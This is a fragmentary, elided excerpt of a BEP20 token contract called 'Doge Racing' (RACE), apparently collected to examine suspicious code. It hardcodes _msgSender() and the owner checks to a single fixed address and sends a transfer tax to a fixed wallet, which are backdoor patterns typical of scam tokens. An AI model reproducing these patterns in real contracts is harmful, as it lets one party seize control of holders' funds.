...
contract Context {
    ...
    function _msgSender() internal pure returns (address) {
        return 0xba92b4412Fc50FFEca4E2c28fAA28fCb3779D8Cc;
    }
}
...
abstract contract Ownable is Context {
    ...
    constructor () {
         ...
         _owner = 0xba92b4412Fc50FFEca4E2c28fAA28fCb3779D8Cc ;
     ...
     */
    modifier onlyOwner() {
        require(_owner == 0xba92b4412Fc50FFEca4E2c28fAA28fCb3779D8Cc , "Ownable: caller is not the owner");
        _;
    }
...
contract RACE is Context, Ownable, IBEP20, BEP20Detailed {
  ...
  using SafeMath for uint256;
    ...
    address public taxWallet = 0x2e6bf50bC1c1F526Ed47E00858F53c30c21971C6;
   
  
    address public _owner;
  
    constructor () BEP20Detailed("Doge Racing", "RACE", 18) {
      _owner = 0xba92b4412Fc50FFEca4E2c28fAA28fCb3779D8Cc ;
    ...
    function _transfer(address sender, address recipient, uint amount) internal{
        ...
        {
            taxFee = 5;
            taxedAmount = amount.mul(taxFee).div(100);
            netAmount = amount - taxedAmount;
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(netAmount);
            _balances[taxWallet] = _balances[taxWallet].add(taxedAmount);
            emit Transfer(sender, recipient, netAmount);
            emit Transfer(sender, taxWallet, taxedAmount);    
        }
        else
        {
            taxFee = 2;
